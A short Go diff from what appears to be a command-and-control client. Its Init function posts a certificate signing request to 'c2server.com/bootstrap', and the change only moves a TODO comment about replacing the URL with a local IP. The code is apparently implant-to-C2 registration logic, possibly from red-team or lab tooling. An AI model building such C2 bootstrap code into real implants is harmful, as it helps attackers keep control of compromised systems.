@@ -33,10 +33,9 @@ func Init() {
 	client := setupBootstrapComms()
 
 	// send csr to server
-	// TODO: check what url should be
 	resp := pkg.Post(
 		client,
-		"https://c2server.com/bootstrap",
+		"https://c2server.com/bootstrap", // TODO: probably change to hard coded ip address as running locally
 		"application/pem-certificate-chain",
 		csrPEM,
 	)
